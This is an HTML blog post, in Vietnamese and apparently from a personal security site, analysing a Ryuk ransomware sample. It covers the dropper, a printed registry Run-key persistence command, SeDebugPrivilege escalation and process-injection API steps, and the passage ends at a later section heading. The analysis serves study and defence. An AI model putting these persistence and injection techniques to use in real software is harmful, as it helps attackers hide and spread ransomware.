@@ -1,0 +1,1160 @@
+<!DOCTYPE html>
+<html lang="vi">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="color-scheme" content="light dark">
+  
+
+
+
+<meta name="description" content="Ryuk Ransomware: Deep Dive &amp; Technical Analysis">
+
+  <title>Ryuk Ransomware: Deep Dive &amp; Technical Analysis</title>
+  <link rel="icon" type="image/png" sizes="32x32" href="https://wen.is-a.dev/img/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://wen.is-a.dev/img/favicon-16x16.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://wen.is-a.dev/img/apple-touch-icon.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Amatic+SC:wght@400;700&family=Ancizar+Sans:ital,wght@0,100..1000;1,100..1000&family=Bitter:ital,wght@0,100..900;1,100..900&family=Indie+Flower&family=Lora:ital,wght@0,400..700;1,400..700&family=Marcellus&display=swap"
+    rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,400;0,600;1,400;1,600&display=swap"
+    rel="stylesheet">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@500..700&display=swap" rel="stylesheet">
+  
+  <style>
+  /* light mode colors */
+  body {
+    /* --primary-color: #5871a2; */
+    --primary-color: #005e05;
+    --primary-pale-color: #5871a233;
+    --primary-decoration-color: #5871a210;
+    --bg-color: #f0f9ff;
+    /* --text-color: #2f3030; */
+    --text-color: #000000;
+    /* --text-pale-color: #767676; */
+    --text-pale-color: #000000;
+    --text-decoration-color: #a9a9a9;
+    --highlight-mark-color: #5f75b020;
+
+    --callout-note-color: #5871a2;
+    --callout-tip-color: #268556;
+    --callout-important-color: #885fc9;
+    --callout-warning-color: #ab6632;
+    --callout-caution-color: #c64e4e;
+  }
+
+  /* dark mode colors */
+  body.dark {
+    /* --primary-color: #6f8fd1; */
+    --primary-color: #ecf16b;
+    --primary-pale-color: #6f8fd166;
+    --primary-decoration-color: #6f8fd112;
+    /* --bg-color: #1c1c1c; */
+    /* --bg-color: #002727; */
+    /* --bg-color: #002333; */
+    --bg-color: #01242E;
+    /* --text-color: #c1c1c1; */
+    --text-color: #ffffff;
+    /* --text-pale-color: #848484; */
+    --text-pale-color: #ffffff;
+    --text-decoration-color: #5f5f5f;
+    --highlight-mark-color: #8296cb3b;
+
+    --callout-note-color: #6f8fd1;
+    --callout-tip-color: #47976f;
+    --callout-important-color: #9776cd;
+    --callout-warning-color: #ad7a52;
+    --callout-caution-color: #d06161;
+  }
+
+  /* typography */
+  body {
+    /* --main-font: ui-sans-serif, system-ui, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji'; */
+    --main-font: 'Nunito', ui-sans-serif, system-ui, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
+    --heading-font: 'Quicksand', 'Lora', 'Bitter', ui-sans-serif, system-ui, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
+
+    --code-font: 'Cascadia Code', 'Fira Code', ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New', monospace;
+    --homepage-max-width: 768px;
+    --main-max-width: 768px;
+    --avatar-size: 75px;
+    --font-size: 16px;
+    --line-height: 1.75;
+    --img-border-radius: 0px;
+    --detail-border-radius: 11px;
+    --dark-mode-img-brightness: 0.75;
+    --dark-mode-chart-brightness: 0.75;
+    --inline-code-border-radius: 2px;
+    --inline-code-bg-color: var(--primary-decoration-color);
+    --block-code-border-radius: 0px;
+    --block-code-border-color: var(--primary-color);
+    --detail-border-color: var(--primary-color);
+  }
+
+
+  #name,
+  #id,
+  #left,
+  a.post,
+  a.back-link,
+  a.tag,
+  a.category,
+  .title {
+    font-family: var(--heading-font);
+  }
+
+  span.date {
+    font-family: var(--code-font);
+    color: var(--text-pale-color);
+  }
+
+  .gif-wrapper {
+    text-align: center;
+    margin: 1.5rem 0;
+  }
+
+  .gif-wrapper .intro-gif {
+    max-width: 96%;
+    height: auto;
+    border-radius: 8px;
+  }
+
+  .verified-icon {
+    display: inline-flex;
+    align-items: center;
+    margin-bottom: 3px;
+    vertical-align: middle;
+  }
+
+  .verified-icon svg {
+    width: 16px;
+    height: 16px;
+  }
+
+  .top-nav {
+    width: 100%;
+    padding-bottom: 1em;
+    border-bottom: 1px solid var(--border-color);
+    background: rgba(var(--background-rgb), 0.85);
+    backdrop-filter: blur(8px);
+    border-radius: var(--detail-border-radius);
+    position: sticky;
+    top: 0;
+    z-index: 1000;
+  }
+
+  .top-nav nav {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    height: 40px;
+  }
+
+  .nav-left,
+  .nav-center,
+  .nav-right {
+    display: flex;
+    align-items: center;
+  }
+
+  .nav-center {
+    flex: 1;
+    justify-content: center;
+  }
+
+  .avatar {
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    margin-top: 1em;
+  }
+
+  .menu-wrapper {
+    position: relative;
+    margin-top: 1.5em;
+  }
+
+  .menu-trigger {
+    font-size: 1.5em;
+    background: transparent;
+    border: none;
+    cursor: pointer;
+    color: var(--text-color);
+  }
+
+  .menu-dropdown {
+    position: absolute;
+    top: 100%;
+    right: 0;
+    display: flex;
+    flex-direction: column;
+
+    background: var(--bg-color);
+    font-family: var(--heading-font);
+    border: 1px solid var(--primary-pale-color);
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+    border-radius: 8px;
+    min-width: 85px;
+    padding: 0.25em 0;
+    z-index: 2000;
+
+    opacity: 0;
+    transform: translateY(-10px);
+    pointer-events: none;
+    transition: opacity 0.25s ease, transform 0.25s ease;
+  }
+
+  .menu-wrapper.active .menu-dropdown {
+    opacity: 1;
+    transform: translateY(0);
+    pointer-events: auto;
+  }
+
+
+  .menu-dropdown a {
+    display: block;
+    padding: 0.6em 1em;
+    text-decoration: none;
+    color: var(--text-color);
+    font-size: 0.95em;
+    margin: auto;
+    transition: background 0.2s ease, color 0.2s ease;
+  }
+
+  #theme-toggle:hover,
+  #rain-toggle:hover {
+    cursor: pointer;
+  }
+
+  .foot-quote,
+  .section-title {
+    font-family: 'Lora', serif;
+    font-style: italic;
+    text-align: center;
+    display: block;
+    margin-top: 2em;
+  }
+
+  .layout-list .post {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 1em;
+  }
+
+  .post>span:first-child {
+    flex: 1;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    min-width: 0;
+  }
+
+  .post>.date {
+    flex-shrink: 0;
+    white-space: nowrap;
+  }
+
+  .year-heading {
+    margin-top: 1.5em;
+    margin-bottom: 0.5em;
+    font-size: 1.5em;
+    font-weight: bold;
+    font-family: var(--heading-font);
+  }
+
+  /* term-caret  */
+  #id.term-caret {
+    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+    position: relative;
+    white-space: nowrap;
+  }
+
+  #id.term-caret::after {
+    content: "_";
+
+    margin-left: 4px;
+    animation: blink 1s steps(1, end) infinite;
+    opacity: 1;
+    color: currentColor;
+  }
+
+  @keyframes blink {
+    50% {
+      opacity: 0;
+    }
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    #id.term-caret::after {
+      animation: none;
+      opacity: 1;
+    }
+  }
+
+  /* typewriter */
+  #id.typewriter {
+    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+    white-space: nowrap;
+    border-right: 1ch solid currentColor;
+    /* caret */
+    /* caret blink */
+    animation: caret-blink 1s steps(1, end) infinite;
+  }
+
+  @keyframes caret-blink {
+    50% {
+      border-right-color: transparent;
+    }
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    #id.typewriter {
+      animation: none;
+      border-right-color: currentColor;
+    }
+  }
+
+  /* glitch effect  */
+  #id.glitch {
+    position: relative;
+    display: inline-block;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+  }
+
+  #id.glitch::before,
+  #id.glitch::after {
+    content: attr(data-text);
+    position: absolute;
+    left: 0;
+    top: 0;
+    clip-path: inset(0 0 0 0);
+    opacity: .85;
+  }
+
+  #id.glitch::before {
+    transform: translate(0, 0);
+    mix-blend-mode: screen;
+    text-shadow: 1px 0 0 #f00;
+    /* viền đỏ */
+    animation: glitch-1 2s infinite linear alternate-reverse;
+  }
+
+  #id.glitch::after {
+    transform: translate(0, 0);
+    mix-blend-mode: screen;
+    text-shadow: -1px 0 0 #0ff;
+    /* viền cyan */
+    animation: glitch-2 2.2s infinite linear alternate-reverse;
+  }
+
+  @keyframes glitch-1 {
+    0% {
+      clip-path: inset(0 0 85% 0);
+      transform: translate(0, 0);
+    }
+
+    20% {
+      clip-path: inset(10% 0 60% 0);
+      transform: translate(-1px, -1px);
+    }
+
+    40% {
+      clip-path: inset(40% 0 30% 0);
+      transform: translate(1px, 1px);
+    }
+
+    60% {
+      clip-path: inset(20% 0 55% 0);
+      transform: translate(-1px, 0);
+    }
+
+    80% {
+      clip-path: inset(70% 0 5% 0);
+      transform: translate(0, 1px);
+    }
+
+    100% {
+      clip-path: inset(0 0 85% 0);
+      transform: translate(0, 0);
+    }
+  }
+
+  @keyframes glitch-2 {
+    0% {
+      clip-path: inset(70% 0 5% 0);
+      transform: translate(0, 0);
+    }
+
+    20% {
+      clip-path: inset(40% 0 30% 0);
+      transform: translate(1px, 0);
+    }
+
+    40% {
+      clip-path: inset(10% 0 60% 0);
+      transform: translate(0, -1px);
+    }
+
+    60% {
+      clip-path: inset(0 0 85% 0);
+      transform: translate(-1px, 1px);
+    }
+
+    80% {
+      clip-path: inset(20% 0 55% 0);
+      transform: translate(1px, 0);
+    }
+
+    100% {
+      clip-path: inset(70% 0 5% 0);
+      transform: translate(0, 0);
+    }
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+
+    #id.glitch::before,
+    #id.glitch::after {
+      animation: none;
+    }
+  }
+</style>
+  <link rel="stylesheet" href="https://wen.is-a.dev/main.css">
+  
+
+<link id="hl" rel="stylesheet" type="text/css" href="/hl-light.css" />
+
+
+
+  
+</head>
+
+<body class="post">
+
+  
+  <script>
+    const theme = sessionStorage.getItem('theme');
+    const match = window.matchMedia("(prefers-color-scheme: dark)").matches;
+    if ((theme && theme === 'dark') || (!theme && match)) {
+      document.body.classList.add('dark');
+      const hl = document.querySelector('link#hl');
+      if (hl) hl.href = 'https://wen.is-a.dev/hl-dark.css';
+    }
+  </script>
+  
+
+  
+<div id="wrapper">
+  <div id="blank"></div>
+  <aside>
+    
+    
+    
+    <button id="back-to-top" aria-label="back to top">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-up"><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></svg>
+
+    </button>
+    
+  </aside>
+  <main>
+    
+<header class="top-nav">
+  <nav>
+    <!-- Left: Back -->
+    <div class="nav-left">
+      <a href="https:&#x2F;&#x2F;wen.is-a.dev&#x2F;posts" class="back-link">← Back</a>
+    </div>
+
+    <!-- Center: Avatar -->
+    <div class="nav-center">
+      
+      <a href="/">
+        <img src="https://wen.is-a.dev/img/qwe.jpg" alt="avatar" class="avatar">
+      </a>
+      
+    </div>
+
+    <!-- Right: Menu dropdown -->
+    <div class="nav-right">
+
+      <div class="menu-wrapper">
+
+        <button class="menu-trigger" aria-label="menu">
+          &#9776;
+        </button>
+        <div class="menu-dropdown">
+          <a href="https://wen.is-a.dev/posts">POSTS</a>
+          <a href="https://wen.is-a.dev/about">ABOUT</a>
+          <a href="https://wen.is-a.dev/contact">CONTACT</a>
+          
+          
+          
+          
+          
+
+          <a id="theme-toggle" aria-label="theme switch">
+            <span class="moon-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18"><path d="M10 7C10 10.866 13.134 14 17 14C18.9584 14 20.729 13.1957 21.9995 11.8995C22 11.933 22 11.9665 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C12.0335 2 12.067 2 12.1005 2.00049C10.8043 3.27098 10 5.04157 10 7ZM4 12C4 16.4183 7.58172 20 12 20C15.0583 20 17.7158 18.2839 19.062 15.7621C18.3945 15.9187 17.7035 16 17 16C12.0294 16 8 11.9706 8 7C8 6.29648 8.08133 5.60547 8.2379 4.938C5.71611 6.28423 4 8.9417 4 12Z" fill="currentColor"></path></svg>
+</span>
+            <span class="sun-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18"><path d="M12 18C8.68629 18 6 15.3137 6 12C6 8.68629 8.68629 6 12 6C15.3137 6 18 8.68629 18 12C18 15.3137 15.3137 18 12 18ZM12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16ZM11 1H13V4H11V1ZM11 20H13V23H11V20ZM3.51472 4.92893L4.92893 3.51472L7.05025 5.63604L5.63604 7.05025L3.51472 4.92893ZM16.9497 18.364L18.364 16.9497L20.4853 19.0711L19.0711 20.4853L16.9497 18.364ZM19.0711 3.51472L20.4853 4.92893L18.364 7.05025L16.9497 5.63604L19.0711 3.51472ZM5.63604 16.9497L7.05025 18.364L4.92893 20.4853L3.51472 19.0711L5.63604 16.9497ZM23 11V13H20V11H23ZM4 11V13H1V11H4Z" fill="currentColor"></path></svg>
+</span>
+          </a>
+
+          
+        </div>
+      </div>
+    </div>
+  </nav>
+</header>
+<script>
+  document.addEventListener("DOMContentLoaded", () => {
+    const trigger = document.querySelector(".menu-trigger");
+    const wrapper = document.querySelector(".menu-wrapper");
+
+    if (trigger && wrapper) {
+      trigger.addEventListener("click", () => {
+        wrapper.classList.toggle("active");
+      });
+
+      document.addEventListener("click", (e) => {
+        if (!wrapper.contains(e.target)) {
+          wrapper.classList.remove("active");
+        }
+      });
+    }
+  });
+
+</script>
+
+
+    <div>
+      
+      
+      
+      
+      <div id="copy-cfg" style="display: none;" data-copy-icon="&lt;svg xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; viewBox=&quot;0 0 24 24&quot; width=&quot;18&quot; height=&quot;18&quot;&gt;&lt;path d=&quot;M6.9998 6V3C6.9998 2.44772 7.44752 2 7.9998 2H19.9998C20.5521 2 20.9998 2.44772 20.9998 3V17C20.9998 17.5523 20.5521 18 19.9998 18H16.9998V20.9991C16.9998 21.5519 16.5499 22 15.993 22H4.00666C3.45059 22 3 21.5554 3 20.9991L3.0026 7.00087C3.0027 6.44811 3.45264 6 4.00942 6H6.9998ZM5.00242 8L5.00019 20H14.9998V8H5.00242ZM8.9998 6H16.9998V16H18.9998V4H8.9998V6Z&quot; fill=&quot;currentColor&quot;&gt;&lt;&#x2F;path&gt;&lt;&#x2F;svg&gt;
+" data-check-icon="&lt;svg xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; viewBox=&quot;0 0 24 24&quot; width=&quot;18&quot; height=&quot;18&quot;&gt;&lt;path d=&quot;M10.0007 15.1709L19.1931 5.97852L20.6073 7.39273L10.0007 17.9993L3.63672 11.6354L5.05093 10.2212L10.0007 15.1709Z&quot; fill=&quot;currentColor&quot;&gt;&lt;&#x2F;path&gt;&lt;&#x2F;svg&gt;
+">
+      </div>
+      
+      <article class="prose">
+        <h1 class="title">Ryuk Ransomware: Deep Dive &amp; Technical Analysis</h1>
+        <div id="post-info">
+          <div id="date">
+            <span id="publish">Nov 20, 2024</span>
+            </div>
+
+          
+        </div>
+
+        
+        
+
+        
+
+        <h2 id="introduction">Introduction<a class="zola-anchor" href="#introduction" aria-label="Anchor link for: introduction" style="visibility: hidden;"></a></h2>
+<p>Nếu bạn nghĩ rằng ransomware chỉ là những đứa trẻ con chơi đùa với máy tính, thì hãy gặp gỡ Ryuk - một "quý ông" trong làng tống tiền mạng. Đây không phải là loại malware bình thường mà bạn có thể gặp khi click nhầm vào quảng cáo "Bạn đã trúng giải 1 tỷ đồng". Ryuk là một phần của "Bộ ba tử thần" (Triple Threat) cùng với Emotet và TrickBot - một combo đủ sức làm cho bất kỳ CISO nào phải thức trắng đêm.</p>
+<h2 id="attack-chain-bai-hoc-ve-su-kien-nhan">Attack Chain: Bài Học Về Sự Kiên Nhẫn<a class="zola-anchor" href="#attack-chain-bai-hoc-ve-su-kien-nhan" aria-label="Anchor link for: attack-chain-bai-hoc-ve-su-kien-nhan" style="visibility: hidden;"></a></h2>
+<p>Ryuk không phải là kẻ hấp tấp. Nó biết cách chờ đợi và chuẩn bị kỹ lưỡng trước khi "ra tay":</p>
+<ol>
+<li><strong>Giai đoạn 1</strong>: Emotet được gửi qua email phishing với tài liệu Word "vũ khí hóa". Tài liệu này chứa macro code tải xuống Emotet.</li>
+<li><strong>Giai đoạn 2</strong>: Emotet thực thi và tải xuống một malware khác (thường là TrickBot) - một "thám tử tư" chuyên nghiệp có thể thu thập thông tin hệ thống, ăn cắp thông tin đăng nhập, vô hiệu hóa antivirus, và di chuyển ngang trong mạng.</li>
+<li><strong>Giai đoạn 3</strong>: Kết nối với máy chủ C&amp;C để tải xuống Ryuk, sau đó tận dụng khả năng di chuyển ngang của TrickBot để lây nhiễm và mã hóa càng nhiều hệ thống trong mạng càng tốt.</li>
+</ol>
+<h2 id="ransomware-ryuk-overview-kien-truc-cua-mot-nghe-si">Ransomware Ryuk Overview: Kiến Trúc Của Một "Nghệ Sĩ"<a class="zola-anchor" href="#ransomware-ryuk-overview-kien-truc-cua-mot-nghe-si" aria-label="Anchor link for: ransomware-ryuk-overview-kien-truc-cua-mot-nghe-si" style="visibility: hidden;"></a></h2>
+<p>Ryuk hoạt động theo hai giai đoạn rõ ràng như một vở kịch được dàn dựng công phu:</p>
+<p><strong>Giai đoạn 1</strong>: Dropper thả ransomware thực sự vào một thư mục khác rồi thoát. Sau đó ransomware cố gắng inject vào các process đang chạy để tránh bị phát hiện. Chúng ta cũng có thể thấy nó khởi chạy một process <code>cmd.exe</code> để chỉnh sửa registry.</p>
+<p><strong>Giai đoạn 2</strong>: Ryuk tiến hành mã hóa các tập tin hệ thống và chia sẻ mạng, thả "thư tình" ransomware (RyukReadMe.txt) vào mỗi thư mục mà nó mã hóa.</p>
+<p><img src="/img/2024/10/ryukdiagram.png" alt="Ryuk Overview Diagram" /></p>
+<p>Bức "thư tình" mà Ryuk để lại cho nạn nhân trông như này:</p>
+<p><img src="/img/2024/10/message.png" alt="Ryuk Message" /></p>
+<h2 id="ryuk-ransomware-sample-information">Ryuk Ransomware Sample Information<a class="zola-anchor" href="#ryuk-ransomware-sample-information" aria-label="Anchor link for: ryuk-ransomware-sample-information" style="visibility: hidden;"></a></h2>
+<p>Mình sẽ dùng PE Studio để lấy các thông tin từ một mẫu Ryuk ransomware mà mình vừa lấy từ <a rel="nofollow noreferrer" href="https://bazaar.abuse.ch/">MalwareBazaar</a>.</p>
+<p><img src="/img/2024/10/info.png" alt="Malware Info" /></p>
+<p>Chương trình này có 3 Dynamic Link Library được import.</p>
+<p><img src="/img/2024/10/dll.png" alt="Dynamic Link Library" /></p>
+<p>Cũng phát hiện khá là nhiều function hệ thống được import theo.</p>
+<p><img src="/img/2024/10/func.png" alt="Function" /></p>
+<h2 id="first-stage-the-dropper-ke-giao-hang-bi-an">First Stage: The Dropper - Kẻ Giao Hàng Bí Ẩn<a class="zola-anchor" href="#first-stage-the-dropper-ke-giao-hang-bi-an" aria-label="Anchor link for: first-stage-the-dropper-ke-giao-hang-bi-an" style="visibility: hidden;"></a></h2>
+<p><strong>SHA256</strong>: <code>23f8aa94ffb3c08a62735fe7fee5799880a8f322ce1d55ec49a13a3f85312db2</code>.</p>
+<p>Dropper này khôn khéo như một tên trộm có kinh nghiệm. Đầu tiên, nó kiểm tra <code>MajorVersion</code> của Windows:</p>
+<ul>
+<li>Nếu bằng 5 (Windows 2000/XP/Server 2003): thả tại <code>C:\Documents and Settings\Default User\</code>.</li>
+<li>Ngược lại: thả tại <code>C:\users\Public\</code>.</li>
+</ul>
+<p><img src="/img/2024/10/dropper.png" alt="Dropper" /></p>
+<p><img src="/img/2024/10/dropperc.png" alt="Dropper in C" /></p>
+<p>Khởi tạo bộ tạo số ngẫu nhiên sau đó tạo chuỗi ngẫu nhiên rồi lưu vào <code>var_28</code>.<br />
+Mục đích để làm tên cho file thực thi - như một mật danh hoàn hảo.</p>
+<p><img src="/img/2024/10/name.png" alt="Random File Name" /></p>
+<p>Đoạn này là lúc tìm vị trí cuối cùng của chuỗi ngẫu nhiên được gen khi nãy.</p>
+<p><img src="/img/2024/10/findstr.png" alt="Find String" /></p>
+<p>Add thêm <code>.exe</code> vào cuối chuỗi đó.</p>
+<p><img src="/img/2024/10/addexe.png" alt="Add Exe" /></p>
+<p>Tạo 1 file mới với đường dẫn là biến <code>var_3f8</code> và set các thuộc tính ẩn cho nó.</p>
+<p><img src="/img/2024/10/newfile.png" alt="alt text" /></p>
+<p>Khởi tạo biến <code>var_8</code> để kiểm tra kiến trúc hệ thống, <code>var_8</code> được thiết lập bằng cách gọi function <code>IsWow64Process</code>.<br />
+Nếu hệ thống là 32-bit, <code>var_8</code> sẽ bằng 0.</p>
+<p><img src="/img/2024/10/initvar8.png" alt="alt text" /></p>
+<p>Tiếp theo nó sẽ kiểm tra kiến trúc hệ thống.<br />
+Nếu hệ thống đang chạy là 32-bit:</p>
+<ul>
+<li><code>nNumberOfBytesToWrite</code> được gán giá trị <code>0x23000</code></li>
+<li><code>lpBuffer</code>được gán địa chỉ của <code>data_43d1b0</code></li>
+</ul>
+<p>Ngược lại nếu hệ thống là 64-bit:</p>
+<ul>
+<li><code>nNumberOfBytesToWrite</code> được gán giá trị <code>0x2aa00</code></li>
+<li><code>lpBuffer</code> được gán địa chỉ của <code>data_4127b0</code></li>
+</ul>
+<p>Các địa chỉ <code>data_43d1b0</code> và <code>data_4127b0</code> là các vùng nhớ chứa mã độc. Việc chọn payload dựa trên kiến trúc hệ thống đảm bảo rằng mã độc hại tương thích với hệ thống mục tiêu.</p>
+<p><img src="/img/2024/10/syscheck.png" alt="alt text" /></p>
+<p>Funtion <code>WriteFile</code> được gọi để ghi payload vào file đã tạo.<br />
+Các tham số truyền vào function là:</p>
+<ul>
+<li><code>ebx_1</code>: Handle của file đã tạo.</li>
+<li><code>lpBuffer</code>: Con trỏ đến vùng nhớ chứa payload.</li>
+<li><code>nNumberOfBytesToWrite</code>: Số byte cần ghi.</li>
+<li><code>lpNumberOfBytesWritten</code>: Con trỏ để lưu số byte đã được ghi.</li>
+</ul>
+<p><img src="/img/2024/10/writefile.png" alt="alt text" /></p>
+<p>Funtion <code>ShellExecuteW</code> được gọi để thực thi file độc hại.<br />
+Các tham số truyền vào function là:</p>
+<ul>
+<li><code>var_3f8</code>: Đường dẫn đến file độc hại.</li>
+<li><code>var_c2c</code>: Đường dẫn đến file hiện tại (truyền vào để sau này biết chỗ xóa Dropper)</li>
+<li><code>SW_HIDE</code>: Chỉ định cách thức hiển thị cửa sổ, trong trường hợp này là ẩn</li>
+</ul>
+<p><img src="/img/2024/10/exefile.png" alt="alt text" /></p>
+<h2 id="second-stage-the-real-deal">Second Stage: The Real Deal<a class="zola-anchor" href="#second-stage-the-real-deal" aria-label="Anchor link for: second-stage-the-real-deal" style="visibility: hidden;"></a></h2>
+<p><strong>SHA256</strong>: <code>8b0a5fb13309623c3518473551cb1f55d38d8450129d4a3c16b476f7b2867d7d</code></p>
+<h3 id="xoa-dropper-don-dep-hien-truong">Xóa Dropper: Dọn Dẹp Hiện Trường<a class="zola-anchor" href="#xoa-dropper-don-dep-hien-truong" aria-label="Anchor link for: xoa-dropper-don-dep-hien-truong" style="visibility: hidden;"></a></h3>
+<p>Trước khi dropper thoát, nó truyền đường dẫn của mình cho executable giai đoạn hai như một tham số dòng lệnh, sau đó executable này sẽ xóa dropper - không để lại dấu vết.</p>
+<p><img src="/img/2024/10/deldrop.png" alt="alt text" /></p>
+<p><img src="/img/2024/10/deldropc.png" alt="alt text" /></p>
+<h3 id="persistence-bam-tru-nhu-sam">Persistence: Bám Trụ Như Sam<a class="zola-anchor" href="#persistence-bam-tru-nhu-sam" aria-label="Anchor link for: persistence-bam-tru-nhu-sam" style="visibility: hidden;"></a></h3>
+<p>Ryuk sử dụng registry key kinh điển để đạt được persistence.<br />
+Nó tạo một giá trị mới với tên là <code>"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\svchos"</code> và dữ liệu được đặt thành đường dẫn executable.</p>
+<p>Lệnh đầy đủ trong mẫu của mình là:</p>
+<pre data-lang="cmd" class="language-cmd z-code"><code class="language-cmd" data-lang="cmd"><span class="z-source z-dosbatch">C:\Windows\System32\<span class="z-keyword z-command z-dosbatch">cmd</span>.exe /C <span class="z-keyword z-command z-dosbatch">REG</span> ADD <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span> /v <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>svchos<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span> /t REG_SZ /d <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>C:\users\Public\oxrCPDa.exe<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span> /f
+</span></code></pre>
+<h3 id="privilege-escalation-xin-phep-de-choi-lon">Privilege Escalation: Xin Phép Để "Chơi Lớn"<a class="zola-anchor" href="#privilege-escalation-xin-phep-de-choi-lon" aria-label="Anchor link for: privilege-escalation-xin-phep-de-choi-lon" style="visibility: hidden;"></a></h3>
+<p>Ryuk sử dụng function <code>AdjustTokenPrivileges()</code> để kích hoạt các privilege đã có trong security access token của process. Privilege mà nó yêu cầu là <code>SeDebugPrivilege</code>. Theo tài liệu Microsoft:</p>
+<blockquote>
+<p><strong>SeDebugPrivilege</strong>: Cho phép debug và điều chỉnh bộ nhớ của các process thuộc sở hữu của account khác. Với privilege này, user có thể attach debugger vào bất kỳ process hoặc kernel nào.</p>
+</blockquote>
+<p>Trong chiến dịch thực tế, Ryuk thường được triển khai sau khi đã compromise hệ thống qua Trickbot hoặc Emotet, vốn chạy với quyền quản trị viên. Để enable <code>SeDebugPrivilege</code>, Ryuk sử dụng <code>LookupPrivilegeValueW</code> để lấy LUID của privilege này, rồi gọi <code>AdjustTokenPrivileges</code> để kích hoạt nó trong token hiện tại. Việc này cho phép Ryuk thao tác lên các process có đặc quyền cao hơn, ví dụ để inject hoặc terminate process bảo vệ.</p>
+<p><img src="/img/2024/10/sedebug.png" alt="alt text" /></p>
+<p>Phương pháp này thường được malware sử dụng để thực hiện process injection (được thực hiện tiếp theo).</p>
+<h3 id="process-injection-nghe-thuat-an-minh">Process Injection: Nghệ Thuật "Ẩn Mình"<a class="zola-anchor" href="#process-injection-nghe-thuat-an-minh" aria-label="Anchor link for: process-injection-nghe-thuat-an-minh" style="visibility: hidden;"></a></h3>
+<p>Ryuk ransomware liệt kê tất cả các process đang chạy để kiểm tra mức độ toàn vẹn, PID và các thông tin hữu ích khác, đồng thời lưu mọi thứ vào một mảng.<br />
+Nó sử dụng các API liệt kê process như là <code>CreateToolhelp32Snapshot</code>, <code>Process32NextW</code>, <code>Process32FirstW</code></p>
+<p>Sau đó, Ryuk lặp qua dữ liệu process đã lưu trữ để thực hiện process injection.</p>
+<p>Ryuk ransomware tự tiêm vào tất cả các process mà nó liệt kê, ngoại trừ một số process không làm giảm hiệu suất hệ thống như <code>csrss.exe</code>, <code>explorer.exe</code>, <code>lsaas.exe</code>.<br />
+Ryuk sẽ bỏ qua các process đó.</p>
+<p><img src="/img/2024/10/procinj.png" alt="alt text" /></p>
+<p>Nó sử dụng các API process injection sau: <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>CreateRemoteThread</code></p>
+<p>Kỹ thuật process injection được sử dụng ở đây khá đơn giản:</p>
+<ol>
+<li>Ryuk cấp phát bộ nhớ cho process của nó tại không gian bộ nhớ của target process bằng <code>VirtualAllocEx()</code></li>
+<li>Sau đó ghi process của nó vào bộ nhớ đã cấp phát bằng <code>WriteProcessMemory()</code></li>
+<li>Cuối cùng tạo thread mới bằng <code>CreateRemoteThread()</code> để chạy thread của Ryuk tại process bị inject</li>
+</ol>
+<h3 id="building-imports-su-che-giau-tinh-te">Building Imports: Sự Che Giấu Tinh Tế<a class="zola-anchor" href="#building-imports-su-che-giau-tinh-te" aria-label="Anchor link for: building-imports-su-che-giau-tinh-te" style="visibility: hidden;"></a></h3>
